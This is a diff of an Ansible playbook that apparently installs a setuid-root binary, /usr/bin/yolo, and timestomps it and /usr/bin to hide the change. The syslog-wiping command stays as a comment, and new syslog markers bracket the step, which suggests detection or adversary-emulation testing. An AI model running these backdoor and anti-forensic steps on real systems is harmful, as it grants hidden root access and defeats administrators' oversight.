@@ -1,7 +1,10 @@
 ---
 # Copyright 2025 dah4k
 # SPDX-License-Identifier: EPL-2.0
-# See Also https://docs.ansible.com/ansible/latest/collections/ansible/builtin/user_module.html
+# See Also
+#   - https://docs.ansible.com/ansible/latest/collections/ansible/builtin/copy_module.html
+#   - https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html
+#   - https://docs.ansible.com/ansible/latest/collections/community/general/syslogger_module.html
 
 - hosts: all
   become: yes  # Run Ansible tasks with root/sudo privileges
@@ -16,6 +19,16 @@
       group: root
       mode: '4755'
 
-  - name: Timestomp YOLO
-    ansible.builtin.shell: touch -r /usr/bin/ls /usr/bin/yolo; touch -r /usr/lib /usr/bin; cat /dev/null > /var/log/syslog
+  - name: Hello YOLO
+    community.general.syslogger:
+      msg: "Hello YOLO"
+      priority: "info"
 
+  - name: Timestomp YOLO
+    #ansible.builtin.shell: touch -r /usr/bin/ls /usr/bin/yolo; touch -r /usr/lib /usr/bin; cat /dev/null > /var/log/syslog
+    ansible.builtin.shell: touch -r /usr/bin/ls /usr/bin/yolo; touch -r /usr/lib /usr/bin
+
+  - name: Goodbye YOLO
+    community.general.syslogger:
+      msg: "Goodbye YOLO"
+      priority: "info"
